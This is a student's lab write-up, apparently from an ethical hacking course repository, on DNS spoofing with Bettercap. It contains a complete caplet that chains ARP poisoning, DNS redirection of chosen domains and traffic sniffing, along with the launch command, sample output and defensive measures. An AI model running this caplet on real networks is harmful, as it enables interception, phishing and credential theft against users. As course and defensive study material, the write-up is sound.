# 🧪 Lab 05: DNS Spoofing with Bettercap Caplets

<div align="center">

**Category:** Network Manipulation & Traffic Redirection &nbsp;|&nbsp; **Difficulty:** Intermediate &nbsp;|&nbsp; **Status:** ✅ Completed

</div>

---

## 📋 Lab Overview

| Field | Details |
|---|---|
| **Objective** | Create a custom Bettercap caplet to automate DNS spoofing and redirect a target's traffic from a legitimate website to a custom attacker-controlled web server |
| **Attacker Machine** | Kali Linux VM (hosting fake website + running Bettercap) |
| **Target Machine** | Windows VM (browsing victim) |
| **Key Tools** | `bettercap`, custom `.cap` caplet, built-in HTTP server |
| **MITRE ATT&CK** | T1557.002 (ARP Cache Poisoning), T1584 (Compromise Infrastructure), T1566 (Phishing via DNS Redirect) |
| **Prerequisite** | Lab 03 (ARP Spoofing), Lab 04 (Bettercap MITM fundamentals) |

### What This Lab Proves

DNS Spoofing at the MITM level means you control what domain names resolve to — **without touching the real DNS server**. The victim types `www.example.com`, the ARP-poisoned network routes the DNS query through your machine, and you respond with **your IP** instead of the real one. The victim lands on your web server, completely unaware.

This lab adds **automation via a Bettercap caplet** — a reusable script that launches the full attack chain with a single command.

---

## 🏗️ Attack Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│                    DNS SPOOFING ATTACK FLOW                         │
│                                                                      │
│   VICTIM (Windows VM)                                                │
│        │                                                             │
│        │  1. Types: http://www.example.com                           │
│        │  2. Sends DNS query → "What is the IP of example.com?"      │
│        ▼                                                             │
│   ┌─────────────┐                                                    │
│   │   GATEWAY   │ ← Thinks it's talking to router (ARP spoofed)     │
│   │  10.0.2.1   │                                                    │
│   └─────────────┘                                                    │
│        │                                                             │
│        ▼  (DNS query intercepted by Kali MITM)                       │
│   ┌─────────────────────────────────┐                                │
│   │        KALI LINUX (Attacker)    │                                │
│   │         10.0.2.x                │                                │
│   │                                 │                                │
│   │  [Bettercap]                    │                                │
│   │   ├── ARP Spoof ON              │                                │
│   │   ├── DNS Spoof ON              │ ← Returns attacker's IP        │
│   │   └── Caplet: dns_spoof.cap     │   for the target domain        │
│   │                                 │                                │
│   │  [Custom Web Server]            │                                │
│   │   └── Apache / Python HTTP      │ ← Serves fake page             │
│   └─────────────────────────────────┘                                │
│        │                                                             │
│        │  3. DNS Response: "example.com = 10.0.2.x (Kali!)"         │
│        ▼                                                             │
│   VICTIM loads ATTACKER'S website instead of real example.com 🎯    │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 📝 Step-by-Step Walkthrough

### Part A: Set Up the Fake Web Server on Kali

Before starting the MITM attack, you need a website for the victim to land on.

#### Step 1: Create the Fake Website

```bash
# Create a directory for the fake site
mkdir -p /var/www/html/fake-site

# Create a simple but convincing landing page
cat > /var/www/html/fake-site/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Demo - Redirected Page</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        h1 { color: #e74c3c; }
    </style>
</head>
<body>
    <h1>⚠️ You've been redirected!</h1>
    <p>This page is hosted on the attacker's machine.</p>
    <p>DNS Spoofing Lab Demo — Ethical Hacking Course (Zaid Sabih)</p>
</body>
</html>
EOF
```

#### Step 2: Start the Web Server

```bash
# Method 1: Using Apache (if installed)
sudo service apache2 start

# Method 2: Python quick server (easiest)
cd /var/www/html/fake-site
sudo python3 -m http.server 80

# Confirm server is running and your Kali IP
ip a | grep "inet " | grep -v "127.0.0.1"
# Note your IP — this is what DNS spoofing will redirect victims to
```

---

### Part B: Write the Bettercap Caplet

A **caplet** (`.cap` file) is Bettercap's scripting format — a list of commands that run automatically when you load it. This is what separates manual attacks from automated, repeatable ones.

#### Step 3: Create the DNS Spoofing Caplet

```bash
# Create the caplet file
nano /root/dns_spoof.cap
```

Paste the following into the file:

```bash
# =============================================
# dns_spoof.cap — DNS Spoofing Automation Caplet
# Author: Sher Singh Rathod
# Course: Zaid Sabih - Learn Ethical Hacking from Scratch
# Lab: 05 — DNS Spoofing with Caplets
# Purpose: Redirect target domain to custom web server
# =============================================

# --- PHASE 1: Network Reconnaissance ---
# Discover all hosts on the network
net.probe on

# Wait a moment for discovery to populate
sleep 3

# Show discovered hosts
net.show

# --- PHASE 2: ARP Spoofing (MITM Position) ---
# Enable full-duplex ARP spoofing (poison both victim AND router)
set arp.spoof.fullduplex true

# Target the victim's IP address
set arp.spoof.targets TARGET_IP_HERE

# Activate ARP spoofing — Kali is now the MITM
arp.spoof on

# --- PHASE 3: DNS Spoofing ---
# Specify the domain(s) to spoof (comma-separated, wildcards supported)
set dns.spoof.domains example.com,*.example.com

# Set the IP to redirect victims to (your Kali IP = your fake web server)
set dns.spoof.address KALI_IP_HERE

# Activate DNS spoofing
dns.spoof on

# --- PHASE 4: Traffic Sniffing (optional but useful) ---
set net.sniff.local true
net.sniff on
```

> 💡 Replace `TARGET_IP_HERE` with the victim's IP (e.g., `10.0.2.15`) and `KALI_IP_HERE` with your Kali machine's IP (e.g., `10.0.2.5`).

---

### Part C: Launch the Attack

#### Step 4: Run the Caplet with Bettercap

```bash
# Single command launches the ENTIRE attack chain
sudo bettercap -iface eth0 -caplet /root/dns_spoof.cap
```

That's it. One command. The caplet handles everything.

#### Step 5: Verify the Attack is Working

Inside the Bettercap shell, you'll see output similar to:

```
[21:30:12] [sys.log] [inf] arp.spoof starting to spoof 1 targets
[21:30:12] [sys.log] [inf] dns.spoof starting to spoof 2 domains
[21:30:15] [dns.spoof] [!] tcp 10.0.2.15:54312 → 8.8.8.8:53 (example.com)
            ↳ spoofed to → 10.0.2.5

# On the victim machine:
# Victim opens browser → types http://example.com
# → Sees YOUR custom web page instead! ✅
```

---

## 📊 Lab Results

| Exercise | Technique | Result | Evidence |
|---|---|---|---|
| Web server setup | Python HTTP server on port 80 | ✅ Success | Custom page served at Kali's IP |
| Caplet creation | Bettercap `.cap` scripting | ✅ Success | Single-command attack automation |
| ARP Spoofing | Full-duplex MITM positioning | ✅ Success | Victim traffic routed through Kali |
| DNS Spoofing | Domain → Kali IP remapping | ✅ **Confirmed** | Target loaded attacker's website instead of original |
| End-to-end test | Full caplet execution | ✅ **Confirmed** | Victim redirected from `example.com` to custom page |

---

## 🔑 Key Concepts Learned

### What is a Caplet?
A Bettercap caplet is a `.cap` script file that holds a sequence of Bettercap commands. Instead of typing commands one-by-one in the Bettercap shell, you write them to a file and load it with `-caplet`. This makes attacks:
- **Repeatable** — Run the same attack consistently
- **Automated** — No manual steps
- **Portable** — Share or document the full attack chain

### How DNS Spoofing + ARP Spoofing Work Together

```
Without MITM position:
  Victim asks → Real DNS Server → Correct IP → Correct Website

With ARP Spoof (MITM):
  Victim asks → Kali intercepts the DNS query
  Kali responds → Attacker's IP → Victim loads attacker's website

The ARP spoof is the prerequisite — without it, Kali never sees the DNS query.
```

### Why This Is Powerful (and Dangerous)

| Attack Scenario | Real-World Risk |
|---|---|
| Redirect banking site | Serve phishing login page — steal credentials |
| Redirect update servers | Serve malware instead of legitimate software |
| Redirect social media | Harvest OAuth tokens / session cookies |
| Redirect search engine | SEO poisoning / misinformation campaigns |

---

## 🛡️ Defensive Measures

| Attack Vector | Defense |
|---|---|
| **ARP Spoofing** (the root attack) | Dynamic ARP Inspection (DAI) on managed switches, 802.1X authentication |
| **DNS Spoofing** | DNS-over-HTTPS (DoH), DNSSEC validation, verify HTTPS certificate matches domain |
| **Fake Web Server** | HTTPS with valid certs makes spoofing obvious (cert mismatch warning) |
| **Caplet automation** | Network IDS/IPS detecting ARP flooding patterns; VLAN segmentation |

---

## ⚠️ Issues Encountered

| # | Issue | Root Cause | Resolution |
|:---:|:---|:---|:---|
| 1 | DNS not being spoofed despite caplet running | `dns.spoof.address` pointed to wrong interface IP | Used `ip a` to confirm the correct Kali IP on the same subnet as the victim |
| 2 | Victim browser still loading real site | Browser DNS cache | Cleared browser cache on victim VM, flushed DNS with `ipconfig /flushdns` |

---

## 🧠 Key Takeaways

1. **Caplets = Professional attack automation** — Writing a `.cap` file is the difference between a manual exploit and a reproducible, documented technique
2. **DNS spoofing requires MITM first** — ARP spoofing is always the prerequisite; DNS spoof alone doesn't work
3. **The victim has no visual clue** — On HTTP sites, the redirect is seamless; HTTPS is the only protection
4. **Works on any domain you specify** — Wildcards (`*.example.com`) catch all subdomains
5. **This is what phishing infrastructure looks like** — Real-world attackers build exactly this: a spoofed domain + a convincing fake page

---

## 🗂️ Files in This Lab

```
lab-05-dns-spoofing-caplets/
└── README.md           ← This file (full walkthrough + results)

# Files created during the lab (on Kali VM):
# /root/dns_spoof.cap                    ← The actual caplet used
# /var/www/html/fake-site/index.html     ← Custom website served to victim
```

---

## 🔗 Navigation
⬅️ [Lab 04: MITM Deep Dive](../lab-04-mitm-deep-dive/README.md) &nbsp;|&nbsp; ➡️ Lab 06: Gaining Access — System Hacking *(Coming Soon)*
